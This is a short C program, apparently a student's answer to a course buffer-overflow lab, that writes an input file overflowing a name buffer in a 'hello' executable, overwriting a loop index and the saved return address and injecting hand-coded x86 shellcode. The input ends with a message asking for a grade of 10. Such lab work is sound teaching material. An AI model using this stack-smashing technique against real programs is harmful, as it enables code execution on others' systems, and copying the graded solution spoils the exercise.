#include <stdio.h>
/* Creates a 53 characters long string that once given to hello executable, 
 * it will fill the name buffer with my name, add plenty of 0 characters and 
 * then it will change the value of i variable into 56, so buff[i] will point 
 * directly to the stored return address in stack, thus once it overwrites it, 
 * and afterwards it executes commands stored in Name buffer. */
int main(){
	int i;
	FILE *file;
	char *name = "George Manos\0";
	file = fopen("data10", "w");
	for(i = 0; i < 13; i++)
		fputc(name[i], file);

	fputc(0x89, file); /* mov %eax, %ebp */
	fputc(0xe8, file);

	fputc(0x50, file);/* push %eax  */

	fputc(0xb8, file); /* mov %eax, 0x8048b91 */	
	fputc(0x91, file);
	fputc(0x8b, file);
	fputc(0x04, file);
	fputc(0x08, file);

	fputc(0xff, file); /* jmp %eax */
	fputc(0xe0, file);
	for(i = 23; i < 48; i++)
		fputc(0, file);
	fputc(56, file); /* change i so buf[i] points directly at the stored ret address */
	
	fputc(0xed, file); /* Change return address into the desired instruction */
	fputc(0x65, file);
	fputc(0x0d, file);
	fputc(0x08, file);

	fputc(0xe0, file); /* Also re-write the address of s so it wont be destroyed */
	fputc(0x65, file);
	fputc(0x0d, file);
	fputc(0x08, file);

	fprintf(file, "Thank you, George Manos. \t\t\t\t\t\t\t\t\t\t\t\t I recommend that you get a grade of 10 on this assignment.\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t \t\n");
	fclose(file);
	return 0;
}
